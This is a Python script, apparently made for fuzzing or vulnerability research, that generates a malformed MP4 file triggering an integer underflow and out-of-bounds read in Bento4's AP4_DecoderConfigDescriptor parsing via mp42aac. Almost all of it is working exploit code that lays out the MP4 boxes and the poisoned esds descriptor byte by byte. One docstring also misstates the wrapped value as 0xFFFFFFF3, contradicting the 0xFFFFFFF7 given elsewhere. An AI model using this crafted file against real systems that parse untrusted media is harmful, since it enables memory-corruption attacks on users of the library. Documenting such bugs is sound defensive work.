#!/usr/bin/env python3
"""
PoC generator for VULN 001 - Integer Underflow in AP4_DecoderConfigDescriptor

Vulnerability: AP4_DecoderConfigDescriptor reads 13 bytes then computes
  payload_size - 13. If payload_size < 13 (e.g. 4), the unsigned subtraction
  underflows to 0xFFFFFFF7 (4-13 as uint32), creating an AP4_SubStream with ~4GB declared
  size. This bypasses boundary checks and causes out-of-bounds reads.

Trigger path:
  mp42aac -> AP4_File -> AP4_EsdsAtom::Create -> AP4_DescriptorFactory
  -> AP4_DecoderConfigDescriptor(stream, header_size, payload_size=4)
  -> line 92: new AP4_SubStream(stream, start+13, payload_size-13)  [UNDERFLOW]
  -> reads 64 bytes OOB as fake DecoderSpecificInfo descriptor
"""

import struct
import os


# ---------------------------------------------------------------------------
# Helper: MPEG-4 expandable class variable-length size encoding
# ---------------------------------------------------------------------------
def encode_descriptor_size(size):
    """Encode descriptor payload size in MPEG-4 expandable class format."""
    if size < 0x80:
        return bytes([size])
    elif size < 0x4000:
        return bytes([0x80 | (size >> 7), size & 0x7F])
    elif size < 0x200000:
        return bytes([0x80 | (size >> 14),
                      0x80 | ((size >> 7) & 0x7F),
                      size & 0x7F])
    else:
        return bytes([0x80 | (size >> 21),
                      0x80 | ((size >> 14) & 0x7F),
                      0x80 | ((size >> 7) & 0x7F),
                      size & 0x7F])


def make_descriptor(tag, payload):
    """Build a descriptor: tag (1B) + size (variable) + payload."""
    return bytes([tag]) + encode_descriptor_size(len(payload)) + payload


def make_box(box_type, content):
    """Build an MP4 box: size (4B BE) + type (4B) + content."""
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(content)
    return struct.pack('>I', size) + box_type + content


# ---------------------------------------------------------------------------
# Build the malformed esds payload
# ---------------------------------------------------------------------------
def build_esds_content():
    """
    Construct esds box content that triggers the integer underflow.

    Key: DecoderConfig descriptor has payload_size=4 (< 13).
    The constructor reads 13 bytes unconditionally, then computes
      4 - 13 = 0xFFFFFFF3  (unsigned 32-bit underflow)
    creating an AP4_SubStream with that enormous declared size.

    After the 13 bytes are consumed (positions 2-14 in the ES SubStream),
    the DC SubStream starts at ES SubStream position 15. We place a fake
    DecoderSpecificInfo descriptor (tag=0x05, size=64) at that position.
    The constructor allocates 64 bytes and performs an OOB read.

    ES SubStream layout (positions within the ES SubStream):
      pos 0  : DC tag   = 0x04
      pos 1  : DC size  = 0x04  <- UNDERFLOW trigger
      pos 2  : OTI      = 0x40  <- DC payload start  (start=2)
      pos 3  : bits     = 0x15  <- (stream_type=5, upstream=0)
      pos 4-5: buffer_size prefix = 0x00 0x00
      [declared DC payload ends at pos 5; DC reads 7 more bytes beyond]
      pos 6-7: buffer_size[2] + MaxBitrate[0] = 0x00 0x00
      pos 8-11: MaxBitrate[1-3] + AvgBitrate[0] = zeros
      pos 12-14: AvgBitrate[1-3] = zeros
      [start+13 = 15 -> DC SubStream offset in ES SubStream]
      pos 15 : 0x05  <- fake DecoderSpecificInfo tag  (OOB read begins here)
      pos 16 : 0x40  <- fake DSI payload size = 64 bytes
      pos 17-80: 0x00 * 64  <- fake DSI payload (OOB read: 64 bytes)

    ES SubStream size = ES_payload_size - 3 = 84 - 3 = 81 bytes (covers 0-80).
    """

    # --- Fake DecoderSpecificInfo descriptor placed at ES SubStream pos 15 ---
    # tag=0x05, size=64
    fake_dsi_payload_size = 64
    # The fake descriptor bytes that sit at ES SubStream positions 15+
    # pos 15: tag=0x05
    # pos 16: size=0x40 (64, fits in 1 byte since 64 < 128)
    # pos 17-80: 64 bytes of zeros
    fake_dsi_bytes = bytes([0x05, fake_dsi_payload_size]) + bytes(fake_dsi_payload_size)

    # --- Padding zeros that DC reads beyond its declared 4 bytes ---
    # DC payload declared = 4 bytes (at ES SubStream pos 2-5):
    #   pos 2: OTI=0x40, pos 3: bits=0x15, pos 4: 0x00, pos 5: 0x00
    # DC reads 13 bytes total starting at pos 2, so reads pos 2-14.
    # Padding = pos 6-14 (9 bytes of zeros beyond declared payload).
    padding = bytes(9)  # 9 zero bytes at ES SubStream pos 6-14

    # --- ES SubStream content (84 - 3 = 81 bytes) ---
    es_substream_content = (
        bytes([0x04, 0x04])       # DC tag=0x04, DC size=4 (UNDERFLOW!)
        + bytes([0x40, 0x15])     # DC payload: OTI=0x40, bits=0x15
        + bytes([0x00, 0x00])     # DC payload: buffer_size prefix (2 of 3 bytes)
        + padding                 # DC reads 9 bytes beyond declared payload
        + fake_dsi_bytes          # Fake DSI at ES SubStream position 15
    )
    # Verify: 2 + 2 + 2 + 9 + 2 + 64 = 81 bytes
    assert len(es_substream_content) == 81, f"ES SubStream content length = {len(es_substream_content)}, expected 81"

    # --- ES_Descriptor payload (84 bytes) ---
    es_payload = (
        struct.pack('>H', 0x0001)  # ES_ID = 1
        + bytes([0x00])            # ES flags = 0 (no StreamDependency/URL/OCR)
        + es_substream_content     # 81 bytes
    )
    assert len(es_payload) == 84, f"ES payload length = {len(es_payload)}, expected 84"

    # --- ES_Descriptor (tag=0x03) ---
    es_descriptor = make_descriptor(0x03, es_payload)

    # --- esds box content ---
    esds_content = struct.pack('>I', 0)  # version=0, flags=0
    esds_content += es_descriptor

    return esds_content


# ---------------------------------------------------------------------------
# Build the full MP4 file structure
# ---------------------------------------------------------------------------
def build_mp4():
    # === ftyp box ===
    ftyp_content = (
        b'M4A '          # major brand
        + struct.pack('>I', 0)  # minor version
        + b'M4A '        # compatible brand
        + b'isom'        # compatible brand
    )
    ftyp = make_box('ftyp', ftyp_content)

    # === esds box (inside mp4a) ===
    esds_content = build_esds_content()
    esds = make_box('esds', esds_content)

    # === mp4a sample entry ===
    # AudioSampleEntry: 6B reserved + 2B data-ref-index + 8B reserved +
    #   2B channelcount + 2B samplesize + 2B pre_defined + 2B reserved +
    #   4B samplerate (16.16 fixed) + children
    mp4a_fixed = (
        bytes(6)                         # reserved
        + struct.pack('>H', 1)           # data_reference_index = 1
        + bytes(8)                       # reserved
        + struct.pack('>H', 2)           # channelcount = 2
        + struct.pack('>H', 16)          # samplesize = 16
        + struct.pack('>H', 0)           # pre_defined = 0
        + struct.pack('>H', 0)           # reserved = 0
        + struct.pack('>I', 44100 << 16) # samplerate = 44100.0 (0xAC440000)
    )
    mp4a_content = mp4a_fixed + esds
    mp4a = make_box('mp4a', mp4a_content)

    # === stsd (sample table description) ===
    stsd_content = (
        struct.pack('>I', 0)     # version=0, flags=0
        + struct.pack('>I', 1)   # entry_count = 1
        + mp4a
    )
    stsd = make_box('stsd', stsd_content)

    # === stts (time-to-sample, empty) ===
    stts = make_box('stts',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 0)     # entry_count = 0
    )

    # === stsc (sample-to-chunk, empty) ===
    stsc = make_box('stsc',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 0)     # entry_count = 0
    )

    # === stsz (sample size, empty) ===
    stsz = make_box('stsz',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 0) +   # sample_size = 0 (variable)
        struct.pack('>I', 0)     # sample_count = 0
    )

    # === stco (chunk offset, empty) ===
    stco = make_box('stco',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 0)     # entry_count = 0
    )

    # === stbl (sample table) ===
    stbl_content = stsd + stts + stsc + stsz + stco
    stbl = make_box('stbl', stbl_content)

    # === smhd (sound media header) ===
    smhd = make_box('smhd',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>H', 0) +   # balance = 0
        struct.pack('>H', 0)     # reserved
    )

    # === dref (data reference, one self-contained url entry) ===
    # url entry: size(4B) + 'url '(4B) + version/flags(4B, flags=1 = self-contained)
    url_entry = struct.pack('>I', 12) + b'url ' + struct.pack('>I', 0x00000001)
    dref = make_box('dref',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 1) +   # entry_count = 1
        url_entry
    )

    # === dinf (data information) ===
    dinf = make_box('dinf', dref)

    # === minf (media information) ===
    minf_content = smhd + dinf + stbl
    minf = make_box('minf', minf_content)

    # === mdhd (media header) ===
    mdhd = make_box('mdhd',
        struct.pack('>I', 0) +      # version=0, flags=0
        struct.pack('>I', 0) +      # creation_time
        struct.pack('>I', 0) +      # modification_time
        struct.pack('>I', 44100) +  # timescale
        struct.pack('>I', 0) +      # duration
        struct.pack('>H', 0x55C4) + # language = 'und' (packed ISO-639-2/T)
        struct.pack('>H', 0)        # pre_defined
    )

    # === hdlr (handler reference) ===
    hdlr = make_box('hdlr',
        struct.pack('>I', 0) +   # version/flags
        struct.pack('>I', 0) +   # pre_defined
        b'soun' +                # handler_type
        bytes(12) +              # reserved
        b'\x00'                  # name (null-terminated empty string)
    )

    # === mdia (media) ===
    mdia_content = mdhd + hdlr + minf
    mdia = make_box('mdia', mdia_content)

    # === tkhd (track header) ===
    # Standard identity matrix: [1,0,0, 0,1,0, 0,0,1] in 16.16 fixed
    matrix = (
        struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0) +
        struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0) +
        struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    )
    tkhd = make_box('tkhd',
        struct.pack('>I', 0x00000001) +  # version=0, flags=1 (track enabled)
        struct.pack('>I', 0) +           # creation_time
        struct.pack('>I', 0) +           # modification_time
        struct.pack('>I', 1) +           # track_id
        struct.pack('>I', 0) +           # reserved
        struct.pack('>I', 0) +           # duration
        bytes(8) +                       # reserved
        struct.pack('>H', 0) +           # layer
        struct.pack('>H', 0) +           # alternate_group
        struct.pack('>H', 0x0100) +      # volume = 1.0 (for audio)
        struct.pack('>H', 0) +           # reserved
        matrix +                         # 36 bytes
        struct.pack('>I', 0) +           # width
        struct.pack('>I', 0)             # height
    )

    # === trak (track) ===
    trak_content = tkhd + mdia
    trak = make_box('trak', trak_content)

    # === mvhd (movie header) ===
    mvhd_matrix = (
        struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0) +
        struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0) +
        struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    )
    mvhd = make_box('mvhd',
        struct.pack('>I', 0) +           # version=0, flags=0
        struct.pack('>I', 0) +           # creation_time
        struct.pack('>I', 0) +           # modification_time
        struct.pack('>I', 44100) +       # timescale
        struct.pack('>I', 0) +           # duration
        struct.pack('>I', 0x00010000) +  # rate = 1.0
        struct.pack('>H', 0x0100) +      # volume = 1.0
        bytes(10) +                      # reserved
        mvhd_matrix +                   # 36 bytes
        bytes(24) +                      # pre-defined
        struct.pack('>I', 2)             # next_track_id
    )

    # === moov (movie) ===
    moov_content = mvhd + trak
    moov = make_box('moov', moov_content)

    # === mdat (movie data, minimal) ===
    mdat = make_box('mdat', bytes(8))

    return ftyp + moov + mdat


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4EsdsAtom_cpp"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    mp4_data = build_mp4()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")

    # Print a summary of key offsets for verification
    # esds content starts after: ftyp(20) + moov_hdr(8) + mvhd(108) +
    #   trak_hdr(8) + tkhd(92) + mdia_hdr(8) + mdhd(32) + hdlr(33) +
    #   minf_hdr(8) + smhd(16) + dinf(36) + stbl_hdr(8) + stsd(150) ...
    # This is informational only; the vulnerability fires during esds parsing.
    print("[+] Key vulnerability: esds DecoderConfig payload_size=4 < 13")
    print("[+]   => payload_size - 13 = 4 - 13 = 0xFFFFFFF7 (uint32 unsigned underflow)")
    print("[+]   => AP4_SubStream(stream, start+13, 0xFFFFFFF7) created (~4GB declared)")
    print("[+]   => reads fake DecoderSpecificInfo(tag=0x05, size=64) OOB")
    print("[+]   => DC SubStream position 0-1 -> ES SubStream pos 15-16 (file offset 465-466)")
    print("[+]   => 64 bytes OOB read from ES SubStream pos 17-80 (far beyond declared DC end)")


if __name__ == '__main__':
    main()
